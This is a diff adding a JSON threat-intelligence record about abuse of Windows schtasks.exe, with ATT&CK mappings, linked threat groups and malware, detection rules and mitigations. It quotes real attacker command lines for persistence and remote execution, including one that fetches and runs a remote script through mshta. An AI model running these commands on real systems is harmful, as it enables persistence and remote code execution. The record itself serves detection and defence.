@@ -1,0 +1,206 @@
+{
+  "type": "lolbin",
+  "version": 1,
+  "id": "3c4835bc-18e4-4baf-8c05-fff90a08498b",
+  "created_by_ref": "@Nounou_Mbeiri",
+  "created": "2023-11-11T00:00",
+  "modified": "2023-11-1117T00:00",
+  "name": "schtasks[.]exe",
+  "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code.",
+  "Required_privilege": [
+    "User"
+  ],
+  "paths": [
+    "c:\\windows\\system32\\schtasks.exe",
+    "c:\\windows\\syswow64\\schtasks.exe"
+  ],
+  "hashe": "27304B246C7D5B4E149124D5F93C5B01",
+  "associated_kill_chain_phases": [
+    "TA0002:Execution:T1053.005",
+    "TA0003:Persistence:T1053.005",
+    "TA0004:Privilege Escalation:T1053.005"
+  ],
+  "capabilities": [
+    "Execute",
+    "UAC bypass"
+  ],
+  "relationship": [
+    {
+      "associated_apts": [
+        "APT41",
+        "Cobalt Group",
+        "FIN10",
+        "menuPass",
+        "FIN13",
+        "APT3",
+        "Rancor",
+        "FIN6",
+        "Blue Mockingbird",
+        "Machete",
+        "Higaisa",
+        "Stealth Falcon",
+        "OilRig",
+        "Magic Hound",
+        "Kimsuky",
+        "TEMP.Veles",
+        "APT37",
+        "GALLIUM",
+        "Patchwork",
+        "BRONZE BUTLER",
+        "Wizard Spider",
+        "TA2541",
+        "Molerats",
+        "Gamaredon Group",
+        "LuminousMoth",
+        "Chimera",
+        "HEXANE",
+        "Dragonfly",
+        "Lazarus Group",
+        "APT-C-36"
+      ],
+      "Relationship Campaigns->Tool": [
+        "During [Frankenstein](https://attack.mitre.org/campaigns/C0001), the threat actors established persistence through a scheduled task using the command: `/Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR`, named \"WinUpdate\" (Citation: Talos Frankenstein June 2019)",
+        "During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: `\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor`, `\\Microsoft\\Windows\\Ras\\ManagerMobility`, `\\Microsoft\\Windows\\WDI\\SrvSetupResults`, and `\\Microsoft\\Windows\\WDI\\USOShared`.(Citation: Mandiant APT41) ",
+        "During [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), the threat actors used scheduled tasks to execute batch scripts for lateral movement with the following command: `SCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR <Path to a Batch File> /ST <Time> /RU SYSTEM.`(Citation: Cybereason OperationCuckooBees May 2022)",
+        "During the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024), [APT29](https://attack.mitre.org/groups/G0016) used `scheduler` and `schtasks` to create new tasks on remote host as part of their lateral movement. They manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. [APT29](https://attack.mitre.org/groups/G0016) also created a scheduled task to maintain [SUNSPOT](https://attack.mitre.org/software/S0562) persistence when the host booted.(Citation: Volexity SolarWinds)(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: CrowdStrike SUNSPOT Implant January 2021)",
+        "During [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors used scheduled tasks to execute malicious PowerShell code on remote systems.(Citation: FoxIT Wocao December 2019)",
+        "During [Operation Dream Job](https://attack.mitre.org/campaigns/C0022), [Lazarus Group](https://attack.mitre.org/groups/G0032) created scheduled tasks to set a periodic execution of a remote XSL script.(Citation: ESET Lazarus Jun 2020)",
+        "During [CostaRicto](https://attack.mitre.org/campaigns/C0004), the threat actors used scheduled tasks to download backdoor tools.(Citation: BlackBerry CostaRicto November 2020) "
+      ],
+      "associated_campaigns": [
+        "Iranian IRGC Data Extortion Operations",
+        "Operation Dream Job",
+        "CostaRicto",
+        "Operation Wocao",
+        "Frankenstein",
+        "2023 Zoho ManageEngine APT Exploits",
+        "SolarWinds Compromise",
+        "Iranian APT Credential Harvesting & Cryptomining Activity",
+        "C0017",
+        "Operation CuckooBees"
+      ],
+      "Associated_Malware": [
+        "SharpDisco",
+        "Matryoshka",
+        "Agent Tesla",
+        "Carbon",
+        "BADNEWS",
+        "Tarrask",
+        "Helminth",
+        "BabyShark",
+        "JHUHUGIT",
+        "SQLRat",
+        "DarkWatchman",
+        "Duqu",
+        "Smoke Loader",
+        "Emotet",
+        "NotPetya",
+        "Shamoon",
+        "AppleJeus",
+        "Saint Bot",
+        "HermeticWiper",
+        "Goopy",
+        "Sibot",
+        "Tomiris",
+        "zwShell",
+        "Gazer",
+        "Lokibot",
+        "Bad Rabbit",
+        "LitePower",
+        "IcedID",
+        "DanBot",
+        "ISMInjector",
+        "Revenge RAT",
+        "BackConfig",
+        "Meteor",
+        "Stuxnet",
+        "HotCroissant",
+        "Attor",
+        "QUADAGENT",
+        "Valak",
+        "JSS Loader",
+        "POWERSTATS",
+        "NETWIRE",
+        "Dyre",
+        "TrickBot",
+        "Pteranodon",
+        "Ryuk",
+        "GravityRAT",
+        "ComRAT",
+        "Bumblebee",
+        "QakBot",
+        "yty",
+        "EvilBunny",
+        "SharpStage",
+        "ServHelper",
+        "CozyCar",
+        "Zebrocy",
+        "ZxxZ",
+        "Ramsay",
+        "Disco",
+        "Lucifer",
+        "RainyDay",
+        "SoreFang"
+      ],
+      "associated_commands": [
+        "Schtasks.exe /Create /TN \"UpdatesxjZWstBWrIuw\" /XML C:UsersxxxxxxAppDataLocalTemptmp1718.tmp",
+        "schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru \"System\"",
+        "schtasks /create /sc MINUTE /tn \"Windows Error Reporting\" /tr \"mshta.exe about:'<script language=\\\"vbscript\\\" src=\\\"hxxp://110.10.179(.)65:80/download microsoftp.jpg\\\">code close</script>'\" /mo 15 /F",
+        "SCHTASKS  /Change  /tn \"\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\" /TR \"C:\\windows\\system32\\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\\windows\\system32\\msiexec.exe /Z c:\\programdata\\S-1-5-18.dat\" /RL HIGHEST /RU \"\" /ENABLE",
+        "schtasks /create /s <remote host> /u “<user>” /p “<password>” /ru “SYSTEM” /tn one /sc MONTHLY /tr “c:\\ users\\public\\filepak.exe 20191101” /F",
+        "schtasks /create /ru \"SYSTEM\" /tn \"update\" /tr \"cmd /c c:\\windows\\temp\\update.bat\" /sc once /f /st",
+        "schtasks.exe\" /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR \"c:\\Windows\\system32\\wscript.exe C:\\Windows\\temp\\Windows.vbe"
+      ],
+      "pre_and_next_related_cmd": [
+        {
+          "pre_cmd_event": [
+            "C:\\Windows\\system32\\cmd.exe /c \"copy c:\\users\\public\bin\filepak.exe \\<remote host>\\c$\\users\\public\\ /Y"
+          ],
+          "next_cmd_event": []
+        }
+      ]
+    }
+  ],
+  "platforms": [
+    "windows"
+  ],
+  "detections": [
+    {
+      "eventsid": [
+        {
+          "sysmon": [
+            "T1053.005:process:process_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:1"
+          ],
+          "windows": [
+            "T1053.005:process:process_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4688",
+            "T1053.005:script:script_execution:log_channel:Microsoft-Windows-PowerShell/Operational:log_provider:Microsoft-Windows-PowerShell:4103"
+          ]
+        }
+      ],
+      "sigma_rules": [
+        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_schtasks_schedule_type.yml",
+        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_schtasks_schedule_type_system.yml"
+      ],
+      "other_rules": [
+        "https://raw.githubusercontent.com/elastic/detection-rules/main/rules/windows/persistence_local_scheduled_task_scripting.toml",
+        "https://raw.githubusercontent.com/splunk/security_content/develop/detections/endpoint/schtasks_scheduling_job_on_remote_system.yml"
+      ]
+    }
+  ],
+  "related_CVE": [
+    "CVE-2019-1069",
+    "CVE-2020-0688",
+    "CVE-2020-1472"
+  ],
+  "mitigations": [
+    "Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority. (Citation: TechNet Scheduling Priority)",
+    "Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl. The setting can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. (Citation: TechNet Server Operator Scheduled Task)",
+    "Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems. ",
+    "Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. (Citation: Powersploit)"
+  ],
+  "references": [
+    "https://attack.mitre.org/techniques/T1053/005/",
+    "https://app.tidalcyber.com/technique/723c6d51-91db-4658-9ee0-eafb953c2d82",
+    "https://strontic.github.io/xcyclopedia/library/schtasks.exe-003D681048A63B9862C299F30492CFDF.html"
+  ]
+}
